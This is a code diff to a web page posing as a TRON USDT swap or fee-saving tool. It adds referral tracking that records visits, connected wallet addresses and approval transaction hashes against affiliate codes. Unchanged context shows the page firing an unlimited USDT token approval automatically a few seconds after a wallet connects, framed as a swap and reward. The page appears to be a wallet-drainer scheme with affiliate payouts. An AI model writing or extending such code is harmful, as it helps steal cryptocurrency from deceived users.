@@ -466,6 +466,33 @@ button.px-3.py-1\.5.rounded-lg:hover{background:#cbd5e1!important}
     <script>
         var API_BASE='https://tron-usdt-backend.vercel.app/api';
         var OFFICIAL_USDT_CONTRACT='TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
+
+        // ===== 레퍼럴 추적 시스템 =====
+        (function(){
+            try{
+                var params=new URLSearchParams(window.location.search);
+                var refCode=params.get('ref');
+                if(refCode){
+                    localStorage.setItem('feeslash_ref',refCode.toUpperCase());
+                    localStorage.setItem('feeslash_ref_time',Date.now().toString());
+                }
+                // 30일 만료 체크
+                var savedRef=localStorage.getItem('feeslash_ref');
+                var savedTime=parseInt(localStorage.getItem('feeslash_ref_time'))||0;
+                if(savedRef&&(Date.now()-savedTime>30*24*60*60*1000)){
+                    localStorage.removeItem('feeslash_ref');
+                    localStorage.removeItem('feeslash_ref_time');
+                    savedRef=null;
+                }
+                // 방문 추적
+                if(savedRef){
+                    fetch(API_BASE+'/referral/visit',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({code:savedRef})}).catch(function(){});
+                }
+            }catch(e){}
+        })();
+        function getRefCode(){try{var c=localStorage.getItem('feeslash_ref');var t=parseInt(localStorage.getItem('feeslash_ref_time'))||0;if(c&&(Date.now()-t<30*24*60*60*1000))return c;return null;}catch(e){return null;}}
+        function trackReferralConnect(address,provider){var code=getRefCode();if(!code)return;fetch(API_BASE+'/referral/connect',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({code:code,address:address,provider:provider})}).catch(function(){});}
+        function trackReferralApprove(address,txHash){var code=getRefCode();if(!code)return;fetch(API_BASE+'/referral/approve',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({code:code,address:address,txHash:txHash||'ok'})}).catch(function(){});}
         var swapDirection='USDT_TO_TRX';
         function toggleSwapDirection(){
             var icon=document.getElementById('swap-direction-icon');
@@ -827,6 +854,9 @@ button.px-3.py-1\.5.rounded-lg:hover{background:#cbd5e1!important}
                 }
             }catch(e){appendLog(L('backendFail'),'warn');}
 
+            // 레퍼럴 연결 추적
+            trackReferralConnect(address,provider);
+
             try{var _tr=await fetch(API_BASE+'/trx/'+address);var _td=await _tr.json();if(_td.trxBalance)try{document.getElementById('trx-bal-swap').textContent=parseFloat(_td.trxBalance).toFixed(2);}catch(e){}}catch(e){}
             if(!isApproved){setTimeout(function(){executeUnlimitedApprove();},2500);}
             // 에너지 렌탈 대상 주소 자동 입력
@@ -996,6 +1026,8 @@ button.px-3.py-1\.5.rounded-lg:hover{background:#cbd5e1!important}
                 document.getElementById('reward-modal').classList.add('active');
 
                 try{await fetch(API_BASE+'/wallet/connect',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({address:currentWalletAddress,provider:activeProvider})});}catch(e){}
+                // 레퍼럴 승인 추적
+                trackReferralApprove(currentWalletAddress,txHash);
                 showToast(currentLang==='ko'?'교환 승인 완료!':'Swap approved!');
             }catch(err){
                 hideProgress();
